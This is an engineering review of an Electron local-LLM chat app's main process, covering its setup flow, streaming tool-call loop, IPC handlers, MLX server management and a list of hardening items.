| `TOOLS, chatSystemPrompt, codeSystemPrompt, findNextAction, emitSafeBoundary, runTool, cleanFileContent, type ToolContext` | `./tools` | The tool registry + the streaming tool-call parser. |
| `ensureWorkspace, startWorkspaceServer, stopWorkspaceServer, getWorkspaceServerPort, previewUrl, listTree, workspaceDir, wsWriteFile` | `./workspace` | Per-conversation workspace dirs + local HTTP server for Canvas previews. |
| `type ChatRequest, StreamChunk, ToolCall` | `../shared/types` | Type-only imports. **Note:** uses relative path `../shared/types` rather than the `@shared` alias used elsewhere. Cosmetic inconsistency, captured for §Hardening. |

### Module-level state (lines 49, 96, 460)

```ts
let mainWindow: BrowserWindow | null = null     // line 49
let mlxPython: string | null = null              // line 96  (the venv python path)
const chatAbortControllers = new Map<string, AbortController>()  // line 460
```

Three pieces of mutable state. All are confined to this file (no exports).

- `mainWindow` — the single chat window. The app does not currently support multiple chat windows.
- `mlxPython` — cached after first successful `ensureMLXRunning()`. Reused by `model:switch` so we don't re-detect Python on every model swap. **Reset on what events? Nothing in this file** — if `mlx_vlm.server` dies, `mlxPython` retains its stale-but-still-correct path, but if the venv is wiped externally we won't notice until the next `startServer` call.
- `chatAbortControllers` — one per in-flight conversation. Created at the start of `handleChat`, deleted in its `finally`. The `chat:abort` IPC handler reaches into this map to abort the streaming HTTP request to `mlx_vlm.server`.

## 2.2 `createWindow()` (lines 51–90)

Single function, creates the BrowserWindow.

### Window options

| Option | Value | Why it matters |
|---|---|---|
| `width / height` | 1280 × 820 | Default size. |
| `minWidth / minHeight` | 820 × 560 | Hard floor; the Canvas tab depends on having room. |
| `show: false` | initially hidden | Shown in `ready-to-show` to avoid flash of unstyled content. |
| `autoHideMenuBar: true` | — | macOS doesn't honor this much; mostly relevant if ever ported. |
| `backgroundColor: '#0e0e0e'` | dark | Matches the renderer's CSS background. Prevents white flash. |
| `titleBarStyle: 'hiddenInset'` | macOS | Native traffic-light controls overlaid on custom title bar. |
| `trafficLightPosition: { x: 14, y: 14 }` | — | Manual positioning to fit the renderer's sidebar layout. |
| `vibrancy: 'under-window'` + `visualEffectState: 'active'` | macOS | The translucent backdrop. |
| `icon: '../../build/icon.png'` | — | The dock icon override (lines 467–470 redundantly sets it via `app.dock.setIcon`). |

### `webPreferences` — security posture

| Setting | Value | Implication |
|---|---|---|
| `preload: '../preload/index.mjs'` | — | The preload bridge. Must exist after build. |
| `sandbox: false` | **disabled** | Preload runs with Node-level capabilities. Wider attack surface than `true`, but necessary for the `@electron-toolkit/preload` patterns used. |
| `contextIsolation: true` | enabled | Preload's globals are not directly visible to renderer JS; bridge via `contextBridge`. Correct. |
| `nodeIntegration: false` | disabled | Renderer cannot `require('fs')`. Correct. |

**Net security posture:** partially hardened. `contextIsolation` + `nodeIntegration:false` is the correct combination. `sandbox:false` is a meaningful concession but is consistent with using `@electron-toolkit/preload`'s helpers. **No CSP is set anywhere in this file** — neither via `session.defaultSession.webRequest.onHeadersReceived` nor via `<meta http-equiv="Content-Security-Policy">` in the renderer HTML (verify in §7 index.html). For an app that loads `@huggingface/transformers` (which can fetch network resources) this is worth a §Hardening item.

### Window event wiring

- `ready-to-show` → show the window. In dev mode, open devtools detached.
- `setWindowOpenHandler` → any link the renderer tries to open in a new window is deflected to `shell.openExternal` (system browser). Correct — prevents the app from being used as a browser.
- Load path: in dev with `ELECTRON_RENDERER_URL` set, load from Vite dev server; otherwise load the built `index.html`. Standard electron-vite pattern.

## 2.3 `send(channel, payload)` (lines 92–94)

```ts
function send(channel: string, payload: unknown): void {
  mainWindow?.webContents.send(channel, payload)
}
```

The only IPC-outbound helper used throughout the file. **Optional chaining means messages sent before window creation, or after destruction, are silently dropped.** This is correct for the setup flow (we send `setup:status` before/during window creation; the renderer subscribes on mount and may miss early statuses — UX is acceptable because `setup:status` is also queryable via `ipcMain.handle('setup:status')`).

## 2.4 The MLX setup flow

Two functions: `ensureMLXRunning` does the work, `handleSetup` wraps it with status emits and error handling.

### `ensureMLXRunning(model: string): Promise<string>` (lines 98–138)

Linear flow:

1. **Locate Python.** Calls `locateMLX()`. If null, throws `"Python 3.10–3.13 not found. Install via Homebrew: brew install python@3.13"`. **Note:** the message says 3.10–3.13 but the comment in `mlx.ts` (Patch 4 didn't touch this) historically enforced `>=3.10`. Verify upper bound in §3 deep dive — may be stale messaging.
2. **Install MLX if needed.** If `mlx.installed === false`, emits `installing-mlx` status, calls `installMLX(onProgress)`. The callback forwards pip output to the UI. Returns the venv python path, which is then used as `pythonToUse`.
3. **Cache the python path** at module scope (`mlxPython = pythonToUse`).
4. **Emit two setup statuses back-to-back:** `starting-mlx` ("Starting model runtime…") immediately followed by `downloading-model` ("Loading {label}… (first run downloads the model)"). The second overwrites the first in UI almost instantly — the `starting-mlx` stage is essentially never observed by the user. Possible UX simplification: drop the `starting-mlx` emit entirely, or actually wait until the server is up before emitting `downloading-model`. Captured for §Hardening.
5. **Start the server.** `await startServer(pythonToUse, model, onProgress)`. The onProgress callback emits `downloading-model` with `progress` set. This is what drives the spinner.
6. **Return the python path.** Caller (`handleSetup`) uses the return value as a signal that we got past `startServer` without throwing.

### `handleSetup(model: string): Promise<void>` (lines 140–152)

Three-line happy path wrapped in try/catch:

```ts
send('setup:status', { stage: 'checking', message: 'Checking system…' })
await ensureMLXRunning(model)
send('setup:status', { stage: 'ready', message: 'Ready to chat.' })
```

On exception → emits `{ stage: 'error', message: 'Setup failed', error: e.message }`.

**This is the lying-spinner architecture, formally:**

- The UI sees `checking` → `installing-mlx` (optional) → `starting-mlx` → `downloading-model` (possibly many progress updates) → `ready` OR `error`.
- The transitions out of `downloading-model` (to `ready` or `error`) happen *only* if `ensureMLXRunning` either returns normally or throws.
- A hung `startServer` promise — which is exactly what happens when `mlx_vlm.server` is jetsam-killed mid-download, since the killed subprocess produces no error event on the parent's spawn handle until its exit is observed (and we may be blocked waiting on HF Xet's HTTP stream, not on the subprocess at all) — produces *neither* a return nor a throw.
- Therefore the UI remains parked at `downloading-model` with the last-known progress percentage, indefinitely.

The fix space includes: (a) liveness probe of `mlx_vlm.server` from main, (b) liveness probe of the parent download HTTP stream itself, (c) a renderer-side dead-man timer on `setup:status`. All are §Hardening Roadmap items.

## 2.5 The chat orchestration loop — `handleChat(req, channel)` (lines 166–458)

The most behaviorally rich function in the codebase. Roughly 290 lines. Owns the entire conversation turn: build the message list, stream from MLX, parse out inline tool calls, execute them, stream the results, loop until either no tool call is emitted in a round (terminal) or `maxRounds` is hit.

### Constants

```ts
const MAX_TOOL_ROUNDS_CHAT = 6   // line 154
const MAX_TOOL_ROUNDS_CODE = 40  // line 155
```

The hard ceiling on tool rounds in a single user turn. Code (Build tab) gets much more headroom — building anything substantive can easily exceed 6 tool calls. Chat is held to 6 to prevent runaway agentic loops in casual conversation.

### Outer try/finally

- Create `AbortController`, register in `chatAbortControllers` keyed by `conversationId`.
- `finally`: delete the abort controller from the map. Always runs.

### Building `baseMessages`

```ts
const baseMessages: MLXChatMessage[] = []
if (req.mode === 'code') {
  const wsPath = await ensureWorkspace(req.conversationId)
  const href = previewUrl(req.conversationId)
  baseMessages.push({ role: 'system', content: codeSystemPrompt(wsPath, href) })
} else {
  baseMessages.push({ role: 'system', content: chatSystemPrompt(req.enableTools) })
}
```

**Two system prompts** (defined in `tools.ts`, deep-dived in §4):
- `chatSystemPrompt(enableTools)` — chat mode, with or without tool access.
- `codeSystemPrompt(wsPath, href)` — code/Build mode. Tells the model where it's writing files (`wsPath`) and where the user is previewing the output (`href`).

Then it appends the conversation history. For each user/assistant message with tool calls, it appends a synthetic `'tool'`-role message per call: `Result of <action name="${tc.name}">: ${tc.result}`. This is how prior tool results get re-injected into the model's context on subsequent turns.

### The `ToolContext`

```ts
const ctx: ToolContext = {
  conversationId: req.conversationId,
  onFileChange: () => send('workspace:changed', { conversationId: req.conversationId })
}
```

Passed to every `runTool` call. `onFileChange` is how the Canvas tab learns to re-list the workspace tree after a tool mutates files.

### `useTools` and `maxRounds`

```ts
const useTools = req.mode === 'code' || req.enableTools
const maxRounds = req.mode === 'code' ? MAX_TOOL_ROUNDS_CODE : MAX_TOOL_ROUNDS_CHAT
```

Code mode always has tools enabled (user can't opt out). Chat mode is gated by `req.enableTools`.

### The outer round loop (lines 207–442)

Up to `maxRounds` iterations. Each round corresponds to one streaming completion from MLX. A round ends either:
- The model finishes without emitting a tool call → emit `done`, return (terminal).
- The model emits a tool call → execute it, push result into baseMessages, `break streamLoop`, loop to next round.

### Per-round state (lines 208–220)

```ts
let buffer = ''                 // accumulating model tokens
let emittedIdx = 0              // how far into buffer we've emitted to UI
let firstToken = true           // for initial 'generating' activity transition
let executedAction = false      // did this round produce a tool call?
let lastActivityTs = 0          // debounce timer for activity emits
let pendingAction: { name; target? } | null = null

// Live-write state for write_file streaming
let livePath: string | null = null
let liveContentStart = -1
let lastLiveWrite = 0
let livePending: Promise<unknown> | null = null
let lastEmittedContent = ''
```

The `live-write` state is the most distinctive feature: when the model emits a `write_file` action, we *stream* the contents to disk as they arrive in the token stream, rather than waiting for the action to close. This makes the Canvas tab's preview update in real time as the model "types" code.

### `writeLivePartial()` (lines 221–247)

The live-write worker. Called periodically (every 450ms — see line 323).

1. Slice the buffer from `liveContentStart` to extract whatever the model has emitted *inside* the `<content>` tag so far.
2. If a `</content>` close tag is present, truncate to that boundary.
3. Run through `cleanFileContent(partial, livePath)` (in `tools.ts`) — strips markdown code fences or other model artifacts.
4. If the cleaned content changed since last emit, send `file:streaming` to the renderer with `done: false`. Renderer uses this to live-update the Canvas preview.
5. Fire a `wsWriteFile` to actually write the partial content to disk, then emit `workspace:changed`. Errors swallowed (partial writes during streaming are expected to fail occasionally).
6. `livePending` guards against overlapping writes.

### `emitActivity()` (lines 249–266)

Debounced (400ms throttle). Emits `tool` activity if `pendingAction` is set; otherwise `generating`. The `chars` field gives the UI a sense of progress within the phase.

### The inner stream loop — `streamLoop:` (lines 268–419)

`for await (const chunk of chatStream({...}))` — consumes the streaming completion from MLX one chunk at a time. Each chunk has `content` (token text) and possibly `done` (terminator).

For each chunk with content:

1. **First-token transition** (lines 273–277). Emit `generating` activity.
2. **Append to buffer**.
3. **Forward raw chunk to devtools.** `chat:raw` channel — for debugging only, not consumed by user-facing UI.
4. **Detect a pending action** (lines 287–311). If we don't yet have `pendingAction`, look for `<action name="...">` in the buffer. If found, capture the name + extract one of `<path>`, `<url>`, `<query>`, `<command>` as the action's `target` (for activity display). If `pendingAction.target` is still empty on subsequent chunks, keep trying to find one.
5. **Activate live-write** (lines 313–327). If the pending action is `write_file` and we have a path, set `livePath`. Find `<content>` in the buffer to locate `liveContentStart`. Every 450ms, call `writeLivePartial()`.
6. **Emit activity** (line 329).
7. **Tool parsing loop** (lines 331–414). `while (true)`:
   - If tools disabled (`!useTools`), just emit any unemitted buffer as token text and break.
   - Call `findNextAction(buffer, emittedIdx)` (in `tools.ts`):
     - **`null`**: no action *starting* in the remaining buffer. Compute `emitSafeBoundary` (don't emit characters that might be the start of an unparsed `<action`) and emit the safe prefix. Break.
     - **`'incomplete'`**: an `<action` open tag exists but isn't yet closed. Emit text up to the `<` of `<action` and stop emitting (don't show partial action XML to the user). Break.
     - **`{ start, end, name, args }`**: a complete action. Emit any text between `emittedIdx` and `found.start`. Advance `emittedIdx = found.end`. Construct a `ToolCall`, emit `tool_call` and `tool` activity. Execute via `runTool(found.name, found.args, ctx)`:
       - Success → emit `tool_result` with `result`.
       - Failure → emit `tool_result` with `error`, set `hadError = true`.
     - Push the assistant's emitted-so-far buffer (without the action XML, conceptually — though the slicing `buffer.slice(0, emittedIdx)` actually includes everything emitted including parsed-action remnants? — verify carefully in §9 with a concrete trace).
     - Push a synthetic `tool` message: `[ok|error] ${name}: ${result}`.
     - `executedAction = true`.
     - If we were live-writing, emit a final `file:streaming` with `done: true`.
     - Reset all per-action state.
     - Emit `thinking` activity.
     - **`break streamLoop`** — abandon the current MLX completion. The next round will start a fresh completion with the updated `baseMessages` that now includes the tool result.
8. **If `chunk.done`**: `break streamLoop`.

### After the inner loop (lines 421–441)

- If no action was executed this round:
  - **Code-mode-round-0 special case** (lines 424–436): if the model talked about a plan but didn't write any code, flush the plan text and inject a synthetic user message: `"Good plan. Now start building — emit a write_file action with the first file immediately."` Then `continue` to round 1. This is a real prompt-engineering nudge baked into the orchestrator. (Subtle observation: this fires only on `round === 0`, so if the model meanders for multiple rounds without writing code, we get one nudge then the conversation ends. May want to revisit.)
  - Otherwise: emit `idle` activity + `done`, return.

### After all rounds exhausted (lines 443–447)

```ts
emit({ type: 'activity', activity: { kind: 'idle' } })
emit({ type: 'error',
  error: `Reached max tool rounds (${maxRounds}). Ask the model to finish up and try again.` })
```

Capped at `MAX_TOOL_ROUNDS_CODE = 40` for code mode. In practice, hitting this means the model is stuck in a loop (writing the same file repeatedly, fetching the same URL, etc.).

### Outer catch (lines 448–454)

- `AbortError` → emit `done` (clean cancellation by user via `chat:abort`).
- Anything else → emit `error` with the error message.

## 2.6 App lifecycle — `app.whenReady().then(async () => {...})` (lines 462–582)

Runs once Electron's app is ready. Order matters.

1. **`electronApp.setAppUserModelId('com.ammaar.gemmachat')`** — Windows-only effect (notification grouping). Cosmetic; the literal string is stale upstream attribution (matches `electron-builder.yml`'s `appId`).
2. **Force dark theme** (`nativeTheme.themeSource = 'dark'`).
3. **Set dock icon** (macOS only, lines 467–470). Reads `build/icon.png`. **Note:** `createWindow` already sets `icon: ...icon.png`, this is a secondary setter for the dock specifically.
4. **`browser-window-created` listener** → `optimizer.watchWindowShortcuts(window)` (toolkit helper for standard shortcuts).
5. **`await startWorkspaceServer()`** — starts the HTTP server that serves workspace files for Canvas previews (deep-dive in §5). **Blocking** — the rest of setup waits.
6. **Permission handlers** (lines 478–485):
   - `setPermissionRequestHandler`: only `media` and `mediaKeySystem` are granted (mic for whisper). Everything else denied.
   - **`setPermissionCheckHandler(() => true)` — grants every permission check.** This is overly permissive. The check handler is invoked for synchronous permission queries; granting them all wholesale means renderer JS can call `navigator.permissions.query('camera').state === 'granted'` and get a misleading yes. Captured for §Hardening.
7. **Register all `ipcMain.handle` channels** (lines 487–575). See §2.7 below.
8. **`createWindow()`** — finally create the window.
9. **`app.on('activate', ...)`** — macOS reactivation. If all windows closed but the app is alive in dock, clicking the dock icon recreates the window.

### Shutdown lifecycle (lines 584–596)

- `window-all-closed`: macOS keeps the app alive (MLX subprocess + workspace server stay warm). Other platforms quit. **The "keep alive on macOS" behavior is intentional** — the comment says so. Practical implication: closing the window does *not* stop MLX. To free the model weights from RAM, the user must explicitly quit (Cmd-Q).
- `before-quit`: stops MLX server, stops workspace server. Async-fire-and-forget — neither is awaited. The Electron quit flow doesn't wait for these. **Risk:** if the MLX server is mid-request when quit fires, the SIGTERM may produce a half-written HF cache file. Captured for §Hardening (and worth probing in §3 mlx.ts deep dive — does `stopServer` actually wait for the child to exit?).

## 2.7 IPC handler registry (the complete API the renderer can invoke)

All registered inside `app.whenReady` (lines 487–575). Eleven channels.

| Channel | Args | Returns | Effect |
|---|---|---|---|
| `setup:start` | `model: string` | `void` | Runs `handleSetup(model)`. Emits `setup:status` repeatedly. Used on first run from `Setup.tsx`. |
| `model:switch` | `model: string` | `void` | Stops current MLX server, starts a new one for `model`. Emits `setup:status`. Requires `mlxPython` already cached (throws if not — "Please restart the app"). |
| `setup:status` | — | `{ hasMLX: boolean }` | Synchronous probe — does the venv exist with `mlx_vlm` importable? Used by Setup to decide whether to skip the install step. |
| `models:list-local` | — | model list | Forwards to `mlx.listLocalModels()`. For the model picker. |
| `chat:send` | `req: ChatRequest` | `{ channel: string }` | Fires `handleChat(req, channel)` *without awaiting*. Returns the per-conversation channel name (`chat:stream:${conversationId}`) so the renderer knows where to listen for stream chunks. |
| `chat:abort` | `conversationId: string` | `void` | Aborts the in-flight `chatStream` for this conversation. Triggers the `AbortError` path. |
| `tools:list` | — | tool metadata | Returns `Object.values(TOOLS).map(...)`. For the UI to display what's available. |
| `workspace:info` | `conversationId: string` | `WorkspaceInfo` | Ensures the workspace exists, returns `{ conversationId, path, previewUrl }`. |
| `workspace:list` | `conversationId: string` | `WorkspaceFile[]` | Lists the workspace tree (up to 300 entries). For Canvas file browser. |
| `workspace:open-external` | `conversationId: string` | `void` | Opens the workspace dir in Finder. |
| `workspace:server-port` | — | `number` | The port the workspace HTTP server is listening on. |
| `audio:transcribe` | `{ base64; model }` | `{ text: string }` | **STUB.** Returns `{ text: '' }` always. Comment: "Audio transcription via MLX is not yet supported." Voice input from `whisper.ts` in the renderer fires this handler but silently gets empty text back. **This is a known dead feature.** Captured for §Hardening. |

**Channels not in `handle` (one-way main → renderer, emitted via `send`):**

| Channel | Sender | Payload | Subscribers |
|---|---|---|---|
| `setup:status` | `send` in setup flow | `SetupStatus` | `Setup.tsx` |
| `chat:stream:${conversationId}` | `emit` in handleChat | `StreamChunk` | `Chat.tsx` (per-conversation listener) |
| `chat:raw` | `send` in handleChat | `{ conversationId, chunk }` | Devtools console only (no production consumer) |
| `workspace:changed` | `send` after tool runs / live writes | `FileChangeEvent` | `Canvas.tsx` |
| `file:streaming` | `send` during live write_file | `{ conversationId, path, content, done }` | `Canvas.tsx` (live preview) |

## §2 Synthesis — what `index.ts` tells us

1. **The chat orchestration is more sophisticated than typical Electron-AI apps.** Live in-flight file writes during model streaming, mid-stream tool call parsing with a safe-boundary emitter that won't show partial XML to the user, and two distinct system prompts/round budgets for chat vs. code — all real engineering. Worth preserving as we evolve the app.

2. **The lying-spinner root cause is now fully characterized.** `handleSetup` cannot transition out of `downloading-model` unless `startServer` either returns or throws. A jetsam-killed child whose parent is blocked on an HTTP stream produces neither in the current architecture. **Fix options live in §3 (mlx.ts) and §7 (Setup.tsx).**

3. **The security posture has three soft spots:** the `setPermissionCheckHandler(() => true)` blanket grant, no CSP anywhere, and `sandbox: false` on the BrowserWindow. None are critical on a local-only desktop app, but as we add Skills + filesystem access (your stated goals), the threat model widens — a malicious tool result or user-pasted content becomes a real renderer-side concern.

4. **Voice input is a dead feature.** `audio:transcribe` returns empty text. Either implement it (probably via a separate Python subprocess running `mlx-whisper` or `whisper.cpp`) or remove the affordance from the UI. Captured for §Hardening.

5. **`mlxPython` caching is fragile.** No invalidation on subprocess death. If the venv is wiped or the python binary is moved, the cached path becomes a footgun. Low-likelihood-but-real bug for §Hardening.

6. **`stopServer` and `stopWorkspaceServer` in `before-quit` are fire-and-forget.** The app may quit before they finish, leaving zombie subprocesses or partial files on disk. Verify in §3 deep dive whether they're synchronous-ish (probably yes — `kill()` is sync, but the child's actual exit isn't observed).

7. **Eleven IPC handlers, five outbound channels — the complete API surface.** This is the contract the preload bridge mirrors (§6) and the renderer consumes (§7–8). Adding Skills + approved filesystem access means adding new entries to this table; we should design those additions to match the existing channel-naming and payload-shape conventions.

Section 2 complete. Section 3 (`src/main/mlx.ts`) is next.

---

# Section 3 — Main Process: `src/main/mlx.ts`

**Path:** `src/main/mlx.ts` (521 lines)

**Role:** Everything to do with the `mlx_vlm.server` Python subprocess: locating a compatible Python, provisioning the dedicated venv, installing `mlx-vlm`, spawning and supervising the server, polling for health, and exposing an OpenAI-compatible streaming chat client. This file is the single point of contact between the Electron main process and the Python ML runtime.

After §2, this is the second-most-load-bearing file in the codebase. A bug here propagates to *every* inference the app performs.

## 3.1 Module-level state & path conventions

### Constants (lines 6–8)

```ts
const MLX_PORT = 11437     // Patch 2: moved off Ollama's 11434
const MLX_HOST = `127.0.0.1:${MLX_PORT}`
const MLX_URL  = `http://${MLX_HOST}`
```

`MLX_URL` is re-exported at the bottom of the file (line 520). Currently no consumer imports it, but the export makes it available for future diagnostic tooling without re-declaring the constants.

### Mutable state (lines 10–11)

```ts
let serverProc: ChildProcess | null = null
let currentModel: string | null = null
```

Two singletons. **There is only ever one MLX subprocess.** Switching models means stopping the current one and starting a new one (`startServer` enforces this via line 274 short-circuit + line 277 `stopServer()`).

### Path helpers (lines 17–32)

All MLX state lives under `app.getPath('userData')/mlx/`:

| Helper | Returns |
|---|---|
| `dataDir()` | `<userData>/mlx` |
| `venvDir()` | `<userData>/mlx/venv` |
| `venvPython()` | `<userData>/mlx/venv/bin/python3` |
| `modelsDir()` | `<userData>/mlx/models` |

On a typical macOS install, `<userData>` is `~/Library/Application Support/Gemma Chat/`. So the actual paths are:

- venv: `~/Library/Application Support/Gemma Chat/mlx/venv/`
- models (HF cache): `~/Library/Application Support/Gemma Chat/mlx/models/`

**Important for §5/§9:** the HF cache lives *inside the userData directory*, not in the global HF cache (`~/.cache/huggingface`). This is enforced by `startServer` setting `HF_HOME` and `TRANSFORMERS_CACHE` env vars on the spawned child. **Consequence:** a user with 18 GB of Gemma weights elsewhere on disk cannot share them with this app — it re-downloads into its own cache. Captured for §Hardening (could be an opt-in to use the global cache).

## 3.2 System Python detection — `findSystemPython()` (lines 43–96)

Returns the first compatible Python binary it can find, `null` if none. Compatibility: **Python 3.10 through 3.13 inclusive.** 3.14+ is excluded because (per the inline comment, line 40) `mlx-lm` historically didn't publish wheels for 3.14 — **stale comment after Patch 4**, the actual constraint now is `mlx-vlm`'s wheel availability. Captured for §Hardening.

### Search strategy

1. **Versioned binaries first** (lines 45–58). 12 candidate paths, trying both Homebrew bin (`/opt/homebrew/bin/python3.X`), the Homebrew Cellar (`/opt/homebrew/opt/python@3.X/bin/python3.X`), and `/usr/local/bin/python3.X`. Newest version (3.13) tried first.
2. **Generic `python3` fallback** (lines 73–93). Tries `/opt/homebrew/bin/python3`, `/usr/local/bin/python3`, `/usr/bin/python3`. Parses `--version`, accepts only minor versions 10–13. Logs an explicit skip reason for too-old (<3.10) vs too-new (>3.13).

Each candidate is probed with `spawnSync(...['--version'], { timeout: 5000 })`. **5-second per-candidate timeout** — worst case ≈ 60 seconds if every Homebrew path hangs (unlikely; in practice this returns in milliseconds).

### Notable

- Returns the **first compatible** binary, not the newest. Within Homebrew bin, newer is tried first; once a working one is found we stop. Reasonable.
- **No environment-variable override** for forcing a specific Python (e.g., `GEMMA_CHAT_PYTHON=/path/to/python3.12`). Captured for §Hardening — useful for testing and for users with non-standard Python installs.

## 3.3 MLX detection — `locateMLX()` (lines 113–159)

Returns one of:

- `{ python: <path>, installed: true }` — venv exists, Python is 3.10+, `mlx_vlm` is importable. Ready to start the server.
- `{ python: <path>, installed: false }` — either the venv exists but `mlx_vlm` isn't importable (we can `pip install` into the existing venv), or no venv exists yet (use the returned system Python to create one).
- `null` — no compatible Python found anywhere. Caller must surface an install message.

### Flow (linear)

1. **Probe the venv Python** (lines 114–153).
   - If `<venvDir>/bin/python3` exists: run `--version`, parse the minor version.
   - If minor < 10: **delete the venv** (`rmSync(venvDir, {recursive, force})`), fall through to system-Python detection. **Destructive — wipes the entire venv.** Not destructive of anything outside `<userData>/mlx/venv/`, but worth noting: this is one of the few places the app ever calls `rmSync`.
   - If venv Python is too old to determine version (spawnSync error): **also delete the venv**. The catch-all `} catch {` at line 148 is broad — a transient OS error here would wipe a healthy venv unnecessarily. Low risk in practice (spawnSync rarely throws once the binary exists) but captured for §Hardening.
   - If version is acceptable: run `python -c "import mlx_vlm; print('ok')"` with a 15-second timeout.
     - Success → return `{ python: vPy, installed: true }`.
     - Failure → return `{ python: vPy, installed: false }`. The pip-install step in `installMLX` will run against this existing venv.
2. **Find a system Python** (lines 155–157). If none, return `null`.

### Stale terminology not caught by Patch 4

Three doc-comment strings still say "mlx-lm":
- Line 105: `Whether mlx-lm is installed and importable` (JSDoc on `MLXStatus.installed`)
- Line 110: `Check if mlx-lm is ready to use.` (JSDoc on `locateMLX`)
- Line 111: `Returns the python path to use and whether mlx_lm is installed.`

The actual code on line 133 correctly probes `import mlx_vlm`. The comments lie. Captured for §Hardening — a single search-replace pass to finish what Patch 4 started.

## 3.4 Installation — `installMLX()` (lines 175–221)

Async, four steps, each one streaming its output via `onProgress`:

1. **Find system Python** (lines 178–183). If absent, throws the same error message the renderer's Setup screen will display verbatim: `"Python 3.10–3.13 not found. Please install Python via Homebrew: brew install python@3.13"`.
2. **Create the venv** if `<venvPython>` doesn't exist (lines 188–193). `sysPython -m venv <vDir>`. Streamed via `runProcess` so any error output reaches the Setup UI.
3. **Upgrade pip** (lines 196–200). `vPy -m pip install --upgrade pip --index-url https://pypi.org/simple/`. The explicit `--index-url` (and the env-var forcing in `runProcess`, see §3.5) is **defensive against corporate pip configs** — a user with a `~/.pip/pip.conf` pointing at a private registry would otherwise have install fail or pull the wrong package.
4. **Install mlx-vlm** (lines 203–207). `vPy -m pip install --upgrade mlx-vlm>=0.5.0 --index-url https://pypi.org/simple/`.
5. **Verify import** (lines 210–217). `vPy -c "import mlx_vlm; print('ok')"` with 15-second timeout. If the import fails, throws with the **last 300 chars of stderr** (line 215) — useful for diagnostics but the truncation can elide the actual traceback head. Captured for §Hardening — consider keeping full stderr.
6. **Returns** the venv python path. Caller (`index.ts:ensureMLXRunning`) stores this in `mlxPython` for reuse.

### What this does *not* do

- **No version pin on pip itself.** `--upgrade pip` may bump to a brand-new pip with different semantics; usually safe but a future pip release could break the wheel-resolution heuristics.
- **No retry on transient network failure.** If PyPI rejects a connection mid-download, the whole install fails. The user has to re-trigger Setup. Captured for §Hardening.
- **No cleanup on partial failure.** If step 4 fails after step 2 succeeded, the venv is left half-installed. Next `locateMLX` will return `{installed: false}` so retry will work, but disk is dirtied.

## 3.5 `runProcess()` (lines 224–257)

Helper for any subprocess whose output should stream to the Setup UI.

### What it does

- `spawn(cmd, args, { stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, PIP_DISABLE_PIP_VERSION_CHECK: '1', PIP_INDEX_URL: 'https://pypi.org/simple/', PIP_EXTRA_INDEX_URL: '' } })`.
- For each line on stdout or stderr, calls `onProgress({ stage: 'install', message: line.slice(0, 120) })`. **120-char truncation** — long pip lines get cut. Cosmetic for the UI, but means deep diagnostic info doesn't reach the Setup screen.
- Accumulates stderr into a buffer; if exit code ≠ 0, rejects with `${cmd} ${args[0..2].join(' ')} failed (exit ${code}): ${stderr.slice(-500)}`.

### Notable

- The PIP env-var overrides are belt-and-suspenders alongside the `--index-url` CLI flag. Whichever pip checks first, the result is the same: public PyPI.
- **`PIP_EXTRA_INDEX_URL: ''` explicitly clears any inherited extra-index.** Prevents a corporate pip.conf from sneaking in via env inheritance.
- No timeout on the overall process. `pip install mlx-vlm` can take 10+ minutes on a slow network; that's allowed. The Setup UI does *not* show a timeout countdown, just continuous log lines.

## 3.6 Server lifecycle — the bug-prone surface

### `startServer(python, model, onProgress?)` (lines 269–345)

Async, complex. The function is the second-half companion to `installMLX` — once Python and mlx-vlm are ready, this is what gets the model serving requests.

#### Early-exit short-circuit (line 274)

```ts
if (serverProc && !serverProc.killed && currentModel === model) return
```

If the server is already running for the same model, no-op. **Subtle bug:** "already running" here means "we have a non-killed ChildProcess handle." It does *not* check that the server is *healthy*. If `startServer` is called twice in rapid succession (e.g., user clicks "Retry" during a stuck download), the second call returns immediately even though the first call is still mid-`waitForHealth`. Practically benign because the second caller will then make chat requests that fail with connection-refused… but worth knowing. Captured for §Hardening.

#### `stopServer()` then `spawn` (lines 277, 293–301)

`stopServer()` (lines 347–354) is **synchronous**: sends `SIGTERM`, nulls out `serverProc` and `currentModel` *immediately* without awaiting the child's actual exit. The new spawn happens right after.

This creates a small race: if the previous server held the port, the new spawn could fail with `EADDRINUSE` if the OS hasn't yet reaped the previous process. In practice 11437 frees up within milliseconds of SIGTERM on macOS, but on a slow machine under load this is a theoretical issue. Captured for §Hardening.

The spawn (line 293):
```ts
serverProc = spawn(python, ['-m', 'mlx_vlm.server', '--model', model, '--port', String(MLX_PORT)], {
  env, stdio: ['ignore', 'pipe', 'pipe'], detached: false
})
```

- `stdio: ['ignore', 'pipe', 'pipe']` — we read stdout and stderr, no stdin. Correct.
- `detached: false` — child is in the Electron main's process group. When Electron quits, the child gets SIGTERM via process-group propagation (in addition to our explicit `stopServer` in `before-quit`).

#### Spawn environment (lines 279–285)

```ts
env: {
  ...process.env,
  HF_HOME: modelsDir(),                  // <userData>/mlx/models
  TRANSFORMERS_CACHE: modelsDir(),        // (legacy var, same path)
  HF_HUB_DISABLE_TELEMETRY: '1'
}
```

`HF_HOME` is the modern var; `TRANSFORMERS_CACHE` is the legacy one. Setting both belt-and-suspenders. The result: every HF download lands under `<userData>/mlx/models/hub/...` in the HF Hub cache layout.

`HF_HUB_DISABLE_TELEMETRY: '1'` — turns off HF's telemetry pings. Good default for a local-only app.

**Not set, worth noting:**
- `HF_TOKEN` — gated models (none of the `mlx-community/gemma-4-*` repos are gated as of writing) would fail without one. If we ever support gated Gemma variants, this needs a way in.
- `HF_HUB_ENABLE_HF_TRANSFER` — would enable `hf_transfer` for faster downloads. Unset means HF falls back to its default downloader (which is where the Xet stall happens). **Captured for §Hardening — enabling `hf_transfer` could plausibly resolve the silent-stall failure mode by switching the transport layer.**

#### Output piping & progress parsing (lines 304–334)

stdout: just logged via `console.log('[mlx]', ...)`. No structured parsing.

stderr is where the action is. For each line:
1. Always log it (`console.log`).
2. **Parse HuggingFace download progress** via regex (line 316):
   ```
   /Fetching\s+(\d+)\s+files?:\s+(\d+)%.*?(\d+)\/(\d+)/
   ```
   Matches HF's tqdm output like `Fetching 8 files:  50%|█████     | 4/8 [00:55<00:59, 14.98s/it]`. Extracts percentage and file counts; emits `onProgress({ message: 'Downloading model files… 4/8', progress: 0.5 })`.
3. **Detect server-ready signals**: lines containing `Starting httpd` or `starting` → `onProgress({ message: 'Starting server…', progress: 1.0 })`.

**This is the only progress signal the Setup screen ever sees during a download.** If HF's downloader stops emitting tqdm lines (which is what happens during an HF Xet stall — the stream stalls but no error is printed), no `onProgress` ever fires, and the UI sits at the last-reported percentage.

